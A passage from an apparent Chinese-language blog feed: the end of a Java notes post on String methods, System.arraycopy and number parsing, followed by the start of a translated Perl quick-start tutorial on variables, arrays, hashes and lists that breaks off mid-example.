</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//（与之前的差别：上面的参数是 String 类型，下面的参数是 int 类型）参考数据：a-97,b-98,c-99  </span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从头开始查找是否存在指定的字符  </span></span><br><span class="line">    System.out.println(string.indexOf(<span class="number">99</span>));<span class="comment">//indexOf(int ch)；返回结果：7  </span></span><br><span class="line">    System.out.println(string.indexOf(<span class="string">'c'</span>));<span class="comment">//indexOf(int ch)；返回结果：7  </span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//从fromIndex查找ch，这个是字符型变量，不是字符串。字符a对应的数字就是97。  </span></span><br><span class="line">    System.out.println(string.indexOf(<span class="number">97</span>,<span class="number">3</span>));<span class="comment">//indexOf(int ch, int fromIndex); 返回结果：6  </span></span><br><span class="line">    System.out.println(string.indexOf(<span class="string">'a'</span>,<span class="number">3</span>));<span class="comment">//indexOf(int ch, int fromIndex); 返回结果：6 </span></span><br><span class="line"></span><br><span class="line">    String Str = <span class="keyword">new</span> String(<span class="string">"菜鸟教程:www.runoob.com"</span>);</span><br><span class="line">    String SubStr1 = <span class="keyword">new</span> String(<span class="string">"runoob"</span>);</span><br><span class="line">    String SubStr2 = <span class="keyword">new</span> String(<span class="string">"com"</span>);</span><br><span class="line">    System.out.print(<span class="string">"查找字符 o 第一次出现的位置 :"</span> );</span><br><span class="line">    System.out.println(Str.indexOf( <span class="string">'o'</span> ));</span><br><span class="line">    System.out.print(<span class="string">"从第14个位置查找字符 o 第一次出现的位置 :"</span> );</span><br><span class="line">    System.out.println(Str.indexOf( <span class="string">'o'</span>, <span class="number">14</span> ));</span><br><span class="line">    System.out.print(<span class="string">"子字符串 SubStr1 第一次出现的位置:"</span> );</span><br><span class="line">    System.out.println( Str.indexOf( SubStr1 ));</span><br><span class="line">    System.out.print(<span class="string">"从第十五个位置开始搜索子字符串 SubStr1 第一次出现的位置 :"</span> );</span><br><span class="line">    System.out.println( Str.indexOf( SubStr1, <span class="number">15</span> ));</span><br><span class="line">    System.out.print(<span class="string">"子字符串 SubStr2 第一次出现的位置 :"</span> );</span><br><span class="line">    System.out.println(Str.indexOf( SubStr2 ));</span><br></pre></td></tr></table></figure></li></ul><h3 id="valueOf-把基本数据类型转化成String"><a href="#valueOf-把基本数据类型转化成String" class="headerlink" title="valueOf() 把基本数据类型转化成String"></a>valueOf() 把基本数据类型转化成String</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> i = <span class="number">10</span>; </span><br><span class="line">String str = String.valueOf(i); </span><br><span class="line">valueOf(<span class="keyword">boolean</span> b)<span class="comment">//: 返回 boolean 参数的字符串表示形式。.</span></span><br><span class="line"></span><br><span class="line">valueOf(<span class="keyword">char</span> c)<span class="comment">//: 返回 char 参数的字符串表示形式。</span></span><br><span class="line"></span><br><span class="line">valueOf(<span class="keyword">char</span>[] data)<span class="comment">//: 返回 char 数组参数的字符串表示形式。</span></span><br><span class="line"></span><br><span class="line">valueOf(<span class="keyword">char</span>[] data, <span class="keyword">int</span> offset, <span class="keyword">int</span> count)<span class="comment">//: 返回 char 数组参数的特定子数组的字符串表示形式。</span></span><br><span class="line"></span><br><span class="line">valueOf(<span class="keyword">double</span> d)<span class="comment">//: 返回 double 参数的字符串表示形式。</span></span><br><span class="line"></span><br><span class="line">valueOf(<span class="keyword">float</span> f)<span class="comment">//: 返回 float 参数的字符串表示形式。</span></span><br><span class="line"></span><br><span class="line">valueOf(<span class="keyword">int</span> i)<span class="comment">//: 返回 int 参数的字符串表示形式。</span></span><br><span class="line"></span><br><span class="line">valueOf(<span class="keyword">long</span> l)<span class="comment">//: 返回 long 参数的字符串表示形式。</span></span><br><span class="line"></span><br><span class="line">valueOf(Object obj)<span class="comment">//: 返回 Object 参数的字符串表示形式。</span></span><br><span class="line"><span class="comment">//补充 把String转化成数字</span></span><br><span class="line"><span class="comment">//大多需要使用基本数据型态的包装类别 </span></span><br><span class="line"><span class="comment">//比如说 String 转换成 byte </span></span><br><span class="line"><span class="comment">//可以使用 Byte.parseByte(String s) </span></span><br><span class="line"><span class="comment">//这一类的方法如果无法将 s 分析 则会丢出 NumberFormatException </span></span><br><span class="line"><span class="comment">//byte : </span></span><br><span class="line">Byte.parseByte(String s) : 将 s 转换成 <span class="keyword">byte</span> </span><br><span class="line">Byte.parseByte(String s, <span class="keyword">int</span> radix) : 以 radix 为基底 将 s 转换为 <span class="keyword">byte</span> </span><br><span class="line"><span class="comment">//比如说 Byte.parseByte("11", 16) 会得到 17 ，radix是多少进制</span></span><br><span class="line"><span class="comment">//double : </span></span><br><span class="line">Double.parseDouble(String s) <span class="comment">//将 s 转换成 double </span></span><br><span class="line"><span class="comment">//float : </span></span><br><span class="line">Double.parseFloat(String s) <span class="comment">//将 s 转换成 float </span></span><br><span class="line"><span class="comment">//int : </span></span><br><span class="line">Integer.parseInt(String s) <span class="comment">//将 s 转换成 int </span></span><br><span class="line"><span class="comment">//long : </span></span><br><span class="line">Long.parseLong(String s)</span><br></pre></td></tr></table></figure><h3 id="toUpperCase-toLowerCase"><a href="#toUpperCase-toLowerCase" class="headerlink" title="toUpperCase() toLowerCase()"></a>toUpperCase() toLowerCase()</h3><p>这两个方法<strong>只对英文字母</strong>有效，对其余字符无影响。</p><p>转换成大写，转换成小写</p><h3 id="charAt"><a href="#charAt" class="headerlink" title="charAt()"></a>charAt()</h3><p>取索引处的字符</p><h2 id="StringBuffer-StringBulider"><a href="#StringBuffer-StringBulider" class="headerlink" title="StringBuffer StringBulider"></a>StringBuffer StringBulider</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sb.append()</span><br></pre></td></tr></table></figure><h2 id="System"><a href="#System" class="headerlink" title="System"></a>System</h2><h3 id="System-arraycopy"><a href="#System-arraycopy" class="headerlink" title="System.arraycopy"></a>System.arraycopy</h3><p><code>public static void arraycopy(Object src, int srcPos, Object dest, int destPos, int length)</code></p><p><code>src</code>:源数组;</p><p><code>srcPos</code>:源数组要复制的起始位置;</p><p><code>dest</code>:目的数组;</p><p><code>destPos</code>:目的数组放置的起始位置;</p><p><code>length</code>:复制的长度.</p><h3 id="Integer-toBinaryString"><a href="#Integer-toBinaryString" class="headerlink" title="Integer.toBinaryString"></a>Integer.toBinaryString</h3><p>把整数转化成二进制字符串</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Perl快速入门</title>
      <link href="/2020/12/07/perl_low/"/>
      <url>/2020/12/07/perl_low/</url>
      
        <content type="html"><![CDATA[<blockquote><p>转载自：<a href="https://qntm.org/perl" target="_blank" rel="noopener">https://qntm.org/perl</a></p></blockquote><a id="more"></a><p><a href="https://qntm.org/" target="_blank" rel="noopener">Things Of Interest </a><a href="https://qntm.org/src" target="_blank" rel="noopener">Code </a><a href="https://qntm.org/perl" target="_blank" rel="noopener">Learn Perl in about 2 hours 30 minutes </a></p><p>Perl是一门动态的、动态类型的高阶脚本（解释型）语言，常常与PHP和Python相提并论。Perl的语法借鉴了许多古老的Shell脚本，并且因为过度使用难懂的符号而声名狼藉，这使得人们几乎无法从Google搜索到想要的语法知识。Perl作为一门脚本语言非常适合用作<em>胶水语言</em>，将其他脚本和程序连接到一起。Perl非常擅长处理和生成文本数据，同时也具有高度可移植性和良好的社区支持，使其成为一门应用广泛的脚本语言。Perl的设计哲学是“每个问题都有不止一种解决方法”（TMTOWTDI），而Python的设计哲学“每个问题最好只有唯一一个显而易见的解决方法”与之截然相反。</p><p>Perl有时令人厌恶，不过也有一些很棒的语言特性，就这一点上，Perl和其他编程语言是一样的。</p><p>这篇文章旨在提供知识，而不是为Perl做宣传，目标人群是（比如我自己）：</p><ul><li>不喜欢Perl的官方文档（<a href="http://perl.org/），因为太过于学术性，并且花费太多的版面来讲述一些一辈子用不到的边缘问题" target="_blank" rel="noopener">http://perl.org/），因为太过于学术性，并且花费太多的版面来讲述一些一辈子用不到的边缘问题</a></li><li>通过一些通用约定和示例程序能够快速学习编程语言</li><li>希望拉里·沃尔能够长话短说（译者注：拉里·沃尔是Perl语言的设计者）</li><li>已经知道怎么编程</li><li>除非对工作有用，否则不关心Perl的任何其他细节。</li></ul><p>这篇文档会尽可能精简，而包含的每条信息都是必要的。</p><h3 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h3><ul><li>文章中几乎所有的陈述语句几乎都是“严格说来不完全是真的，现实情况要复杂得多”，如果你看到一个严重的错误，请指出来，不过我保留不修正“善意的谎言”的权利。</li><li>在这片文章里我用<code>print</code>语句来输出数据，但是并不一定追加了换行或者空格，以免我因为过分注意输出样式而发疯。许多示例程序如果真的运行出来，现实结果可能像是“alotofwordsallsmusheduptogetherononeline”，但是，不要在意这些细节。</li></ul><h3 id="Hello-world"><a href="#Hello-world" class="headerlink" title="Hello world"></a>Hello world</h3><p>Perl<em>脚本</em>是带有<code>.pl</code>后缀的文本文件。</p><p>下面是<code>helloworld.pl</code>的全部内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use strict;</span><br><span class="line">use warnings;</span><br><span class="line"></span><br><span class="line">print &quot;Hello world&quot;;</span><br></pre></td></tr></table></figure><p>Perl脚本由Perl解释器解释执行，<code>perl</code>或者<code>perl.exe</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl helloworld.pl [arg0 [arg1 [arg2 ...]]]</span><br></pre></td></tr></table></figure><p>有几点要特别提一下：Perl的语法非常宽容，它允许你写出有歧义的或者有不可预期行为的代码。我不会去解释这些诡异的行为是什么样的，因为你最好避开它们。避免这种情况的方法是在你写的每个Perl脚本或者模块的开头加上<code>use strict; use warnings;</code>。<code>use foo;</code>这种语句叫做<em>编译指示（pragmas）</em>，编译指示是给<code>perl.exe</code>的一个提示，在程序开始执行之前的语法验证阶段会发挥作用，脚本语句实际执行的时候这些编译指示对于运行结果没有影响。</p><p>分号<code>;</code>是语句结束的标志，井号<code>#</code>表示注释的开始，注释直到这行的结尾结束。Perl没有块注释的语法。</p><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p>Perl的变量有三种类型：<em>标量（scalar）</em>、<em>数组（array）</em>和<em>哈希（hashes）</em>（译者注：下文会继续使用英文原文scalar、array和hash），每种类型都有属于自己的<em>符号</em>：分别是<code>$</code>、<code>@</code>和<code>%</code>。变量定义使用<code>my</code>关键字，生命期直到其所在的代码块结束或者文件的末尾。</p><h4 id="Scalar变量"><a href="#Scalar变量" class="headerlink" title="Scalar变量"></a>Scalar变量</h4><p>一个scalar变量能包含：</p><ul><li><code>undef</code>（对应Python中的<code>None</code>、PHP中的<code>null</code>）</li><li>数值（Perl不区分整形和浮点类型）</li><li>字符串</li><li>其他变量的引用。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">my $undef &#x3D; undef;</span><br><span class="line">print $undef; # 打印空字符串&quot;&quot;，并且抛出一个警告</span><br><span class="line"></span><br><span class="line"># 隐式的undef（译者注：未初始化的变量初值默认为undef）：</span><br><span class="line">my $undef2;</span><br><span class="line">print $undef2; # 打印&quot;&quot;，并且抛出完全一样的警告</span><br><span class="line">my $num &#x3D; 4040.5;</span><br><span class="line">print $num; # &quot;4040.5&quot;</span><br><span class="line">my $string &#x3D; &quot;world&quot;;</span><br><span class="line">print $string; # &quot;world&quot;</span><br></pre></td></tr></table></figure><p>（稍后会详细说明“引用”。）</p><p>用<code>.</code>运算符进行字符串连接（与PHP一样）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print &quot;Hello &quot;.$string; # &quot;Hello world&quot;</span><br></pre></td></tr></table></figure><h4 id="“布尔类型”（“Boolean”）"><a href="#“布尔类型”（“Boolean”）" class="headerlink" title="“布尔类型”（“Boolean”）"></a>“布尔类型”（“Boolean”）</h4><p><strong>Perl没有内置的布尔类型。</strong><code>if</code>语句中的scalar变量仅在以下情况下被认为是“false”：</p><ul><li><code>undef</code></li><li>数值<code>0</code></li><li>字符串<code>&quot;&quot;</code></li><li>字符串<code>&quot;0&quot;</code>。</li></ul><p>Perl的文档中<em>反复</em>强调函数在某些情况下返回“true”或者“false”。实际上，当一个函数声称它返回“true”，返回值往往是<code>1</code>，而当一个函数声称它返回“false”，返回值往往是一个空字符串<code>&quot;&quot;</code>。</p><h4 id="弱类型"><a href="#弱类型" class="headerlink" title="弱类型"></a>弱类型</h4><p><strong>无法判定一个scalar包含的是一个数值还是字符串。</strong>更准确的来说，我们没有必要知道这个信息。一个scalar按照数值还是字符串的方式参与运算，是完全取决于运算符的。因此，像字符串一样使用的时候，scalar就按字符串的方式参与运算，而像数值一样使用的时候，scalar就按照数值的方式参与运算（如果无法转换成数值则会抛出一个警告）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">my $str1 &#x3D; &quot;4G&quot;;</span><br><span class="line">my $str2 &#x3D; &quot;4H&quot;;</span><br><span class="line"></span><br><span class="line">print $str1 .  $str2; # &quot;4G4H&quot;</span><br><span class="line">print $str1 +  $str2; # &quot;8&quot; 并且抛出两个警告</span><br><span class="line">print $str1 eq $str2; # &quot;&quot; （空字符串，也就是false）</span><br><span class="line">print $str1 &#x3D;&#x3D; $str2; # &quot;1&quot; 并且抛出两个警告</span><br><span class="line"></span><br><span class="line"># 经典错误</span><br><span class="line">print &quot;yes&quot; &#x3D;&#x3D; &quot;no&quot;; # &quot;1&quot; 并且抛出两个警告，按数值方式参与运算，两边求值结果都是0</span><br></pre></td></tr></table></figure><p>教训是应该总是在恰当的情况下使用正确的运算符，对于比较数值和字符串有两套不同的运算符：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 数值运算符：  &lt;,  &gt;, &lt;&#x3D;, &gt;&#x3D;, &#x3D;&#x3D;, !&#x3D;, &lt;&#x3D;&gt;, +, *</span><br><span class="line"># 字符串运算符：    lt, gt, le, ge, eq, ne, cmp, ., x</span><br></pre></td></tr></table></figure><h4 id="Array变量"><a href="#Array变量" class="headerlink" title="Array变量"></a>Array变量</h4><p>Array变量是包含一个scalar列表的、由从0开始的整形数为下标存取的变量。在Python里被称为<em>list</em>，而在PHP里被称为<em>array</em>。数组可以用一个圆括号包围的scalar列表来声明（译者注：原文declaration，而这里实际表达的含义应为“初始化”，而不是对于变量标识符的声明，下同）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">my @array &#x3D; (</span><br><span class="line">&quot;print&quot;,</span><br><span class="line">&quot;these&quot;,</span><br><span class="line">&quot;strings&quot;,</span><br><span class="line">&quot;out&quot;,</span><br><span class="line">&quot;for&quot;,</span><br><span class="line">&quot;me&quot;, # 末尾多余的逗号语法上是允许的</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>你必须要使用美元符号来存取array中的值，因为<em>取到</em>的值是一个scalar而非array：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">print $array[0]; # &quot;print&quot;</span><br><span class="line">print $array[1]; # &quot;these&quot;</span><br><span class="line">print $array[2]; # &quot;strings&quot;</span><br><span class="line">print $array[3]; # &quot;out&quot;</span><br><span class="line">print $array[4]; # &quot;for&quot;</span><br><span class="line">print $array[5]; # &quot;me&quot;</span><br><span class="line">print $array[6]; # 返回undef，打印&quot;&quot;并且抛出一个警告</span><br></pre></td></tr></table></figure><p>你也可以使用负数作为下标，这样就可以从末尾开始往前取某个元素：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">print $array[-1]; # &quot;me&quot;</span><br><span class="line">print $array[-2]; # &quot;for&quot;</span><br><span class="line">print $array[-3]; # &quot;out&quot;</span><br><span class="line">print $array[-4]; # &quot;strings&quot;</span><br><span class="line">print $array[-5]; # &quot;these&quot;</span><br><span class="line">print $array[-6]; # &quot;print&quot;</span><br><span class="line">print $array[-7]; # 返回undef，打印&quot;&quot;并且抛出一个警告</span><br></pre></td></tr></table></figure><p>同时存在scalar变量<code>$var</code>和包含scalar元素<code>$var[0]</code>的array变量<code>@var</code>是没有冲突的，不过会对代码的读者造成一些误导，所以请避免这种情况。</p><p>取得array的长度</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print &quot;This array has &quot;.(scalar @array).&quot;elements&quot;; # &quot;This array has 6 elements&quot;</span><br><span class="line">print &quot;The last populated index is &quot;.$#array;       # &quot;The last populated index is 5&quot;</span><br></pre></td></tr></table></figure><p>调用Perl脚本时使用的参数列表被保存在<a href="http://perldoc.perl.org/perlvar.html" target="_blank" rel="noopener">内置的array变量</a><code>@ARGV</code>中。</p><p>变量可以被插入到字符串中被求值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print &quot;Hello $string&quot;; # &quot;Hello world&quot;</span><br><span class="line">print &quot;@array&quot;;        # &quot;print these strings out for me&quot;</span><br></pre></td></tr></table></figure><p><strong>小心。</strong>也许有一点你会把某个人的email地址放在一个字符串里，比如<code>&quot;jeff@gmail.com&quot;</code>。Perl会去尝试找一个名叫<code>@gmail</code>的array变量，求值并插入到字符串中，如果没有找到这个变量，将会导致一个运行时错误。有两种方法可以避免对字符串中的变量名求值：用反斜杠对<code>@</code>进行转义，或者将双引号改为单引号。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">print &quot;Hello \$string&quot;; # &quot;Hello $string&quot;</span><br><span class="line">print &#39;Hello $string&#39;;  # &quot;Hello $string&quot;</span><br><span class="line">print &quot;\@array&quot;;        # &quot;@array&quot;</span><br><span class="line">print &#39;@array&#39;;         # &quot;@array&quot;</span><br></pre></td></tr></table></figure><h4 id="Hash变量"><a href="#Hash变量" class="headerlink" title="Hash变量"></a>Hash变量</h4><p>Hash变量是包含一个scalar列表的、由字符串为下标存取的变量。在Python中被称为<em>dictionary</em>，而在PHP中被称为<em>array</em>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">my %scientists &#x3D; (</span><br><span class="line">&quot;Newton&quot;   &#x3D;&gt; &quot;Isaac&quot;,</span><br><span class="line">&quot;Einstein&quot; &#x3D;&gt; &quot;Albert&quot;,</span><br><span class="line">&quot;Darwin&quot;   &#x3D;&gt; &quot;Charles&quot;,</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>请注意这个声明与array何其相似。事实上，这个双箭头符号<code>=&gt;</code>被称为“fat comma”（胖逗号），因为它与逗号完全等价。Hash变量由偶数个元素组成的列表来声明，其中偶数下标（0、2、……）的元素都被当做字符串使用。</p><p>与array一样，你也需要用美元符号来存取hash中的值，因为<em>取到</em>的值是scalar而非hash：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">print $scientists&#123;&quot;Newton&quot;&#125;;   # &quot;Isaac&quot;</span><br><span class="line">print $scientists&#123;&quot;Einstein&quot;&#125;; # &quot;Albert&quot;</span><br><span class="line">print $scientists&#123;&quot;Darwin&quot;&#125;;   # &quot;Charles&quot;</span><br><span class="line">print $scientists&#123;&quot;Dyson&quot;&#125;;    # 返回undef，打印&quot;&quot;并且抛出一个警告</span><br></pre></td></tr></table></figure><p>注意在这里使用的花括号。同样的，同时存在scalar变量<code>$var</code>和包含scalar元素<code>$var{&quot;foo&quot;}</code>的hash变量<code>%var</code>是没有冲突的。</p><p>你可以将一个hash转换为两倍数量元素的array，原先hash中的键和值在转换后的array中交替出现（反向的转换也同样简单）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">my @scientists &#x3D; %scientists;</span><br></pre></td></tr></table></figure><p>然而有一点与array不同，hash中的键<em>没有特定的保存顺序</em>，而是以一种比较高效的方式进行存储。因此，需要注意转换后的array会将hash中的<em>键值对</em>重新排列<em>次序</em>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print &quot;@scientists&quot;; # 输出可能是&quot;Einstein Albert Darwin Charles Newton Isaac&quot;</span><br></pre></td></tr></table></figure><p>回顾一下，我们使用<strong>方括号</strong>来取array中的值，而使用<strong>花括号</strong>来取hash中的值。方括号是一个有效的数值运算符，而花括号是一个有效的字符串运算符，因此事实上，作为<em>下标</em>的值是数值还是字符串类型其实并不重要（译者注：正如前文所提到的，scalar以什么方式参与运算取决于运算符）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">my $data &#x3D; &quot;orange&quot;;</span><br><span class="line">my @data &#x3D; (&quot;purple&quot;);</span><br><span class="line">my %data &#x3D; ( &quot;0&quot; &#x3D;&gt; &quot;blue&quot;);</span><br><span class="line"></span><br><span class="line">print $data;      # &quot;orange&quot;</span><br><span class="line">print $data[0];   # &quot;purple&quot;</span><br><span class="line">print $data[&quot;0&quot;]; # &quot;purple&quot;</span><br><span class="line">print $data&#123;0&#125;;   # &quot;blue&quot;</span><br><span class="line">print $data&#123;&quot;0&quot;&#125;; # &quot;blue&quot;</span><br></pre></td></tr></table></figure><h4 id="列表（Lists）"><a href="#列表（Lists）" class="headerlink" title="列表（Lists）"></a>列表（Lists）</h4><p>Perl中的<em>列表</em>与array和hash都不一样。你已经见过一些列表了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">(</span><br><span class="line">&quot;print&quot;,</span><br><span class="line">&quot;these&quot;,</span><br><span class="line">&quot;strings&quot;,</span><br><span class="line">&quot;out&quot;,</span><br><span class="line">&quot;for&quot;,</span><br><span class="line">&quot;me&quot;,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">(</span><br><span class="line">&quot;Newton&quot;   &#x3D;&gt; &quot;Isaac&quot;,</span><br><span class="line">&quot;Einstein&quot; &#x3D;&gt; &quot;Albert&quot;,</span><br><span class="line">&quot;Darwin&quot;   &#x3D;&gt; &quot;Charles&quot;,</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p><strong>列表不是一个变量</strong>列表是一个暂存的<em>值</em>，可以被<em>赋值</em>到一个array或者hash变量，这就是为什么声明array和hash的语法竟完全一样。在许多情况下“列表”和“array”这两个词可以混用，而在同样多的情况下，列表和array表现出微妙的区别，并且具有极其容易混淆的行为。</p><p>好的，回想一下<code>=&gt;</code>只是<code>,</code>的一种伪装，然后看一下下面的例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(&quot;one&quot;, 1, &quot;three&quot;, 3, &quot;five&quot;, 5)</span><br><span class="line">(&quot;one&quot; &#x3D;&gt; 1, &quot;three&quot; &#x3D;&gt; 3, &quot;five&quot; &#x3D;&gt; 5)</span><br></pre></td></tr></table></figure><p>使用<code>=&gt;</code>暗示了其中一个是hash的声明（译者注：第二个），而另一个是array的声明，但就这两个列表自身并没有声明任何东西，它们只是列表，而且是<em>完全相同的</em>列表。同样的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">()</span><br></pre></td></tr></table></figure><p>这里甚至没有任何变量类型的提示，这个列表可以用来声明一个空array或者空hash，而作为<code>perl</code>解释器则完全无法知道将会是哪一种。一旦你理解了这一点，你也就能理解Perl的这个事实：<strong>列表不能嵌套。</strong>我们可以试一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">my @array &#x3D; (</span><br><span class="line">&quot;apples&quot;,</span><br><span class="line">&quot;bananas&quot;,</span><br><span class="line">(</span><br><span class="line">&quot;inner&quot;,</span><br><span class="line">&quot;list&quot;,</span><br><span class="line">&quot;several&quot;,</span><br><span class="line">&quot;entries&quot;,</span><br><span class="line">),</span><br><span class="line">&quot;cherries&quot;,</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>Perl无法知道<code>(&quot;inner&quot;, &quot;list&quot;, &quot;several&quot;, &quot;entries&quot;)</code>应该是array还是hash，因此Perl假设两者都不是，而<strong>将其扁平化为一个一维长列表</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">print $array[0]; # &quot;apples&quot;</span><br><span class="line">print $array[1]; # &quot;bananas&quot;</span><br><span class="line">print $array[2]; # &quot;inner&quot;</span><br><span class="line">print $array[3]; # &quot;list&quot;</span><br><span class="line">print $array[4]; # &quot;several&quot;</span><br><span class="line">print $array[5]; # &quot;entries&quot;</span><br><span class="line">print $array[6]; # &quot;cherries&quot;</span><br></pre></td></tr></table></figure><p>即使使用fat comma也会是同样的情况：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">my %hash &#x3D; (</span><br><span class="line">&quot;beer&quot; &#x3D;&gt; &quot;good&quot;,</span><br><span class="line">&quot;bananas&quot; &#x3D;&gt; (</span><br><span class="line">&quot;green&quot;  &#x3D;&gt; &quot;wait&quot;,</span><br><span class="line">&quot;yellow&quot; &#x3D;&gt; &quot;eat&quot;,</span><br><span class="line">),</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"># 上面的代码会抛出一个警告，因为我们尝试用7个元素的列表来初始化这个hash</span><br><span class="line"></span><br><span class="line">print $hash&#123;&quot;beer&quot;&#125;;    # &quot;good&quot;</span><br><span class="line">print $hash&#123;&quot;bananas&quot;&#125;; # &quot;green&quot;</span><br><span class="line">print $hash&#123;&quot;wait&quot;&#125;;    # &quot;yellow&quot;;</span><br><span class="line">print $hash&#123;&quot;eat&quot;&#125;;     # undef，因此打印&quot;&quot;并且抛出一个警告</span><br></pre></td></tr></table></figure><p>当然，这倒让连接数组变得简单了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">my @bones   &#x3D; 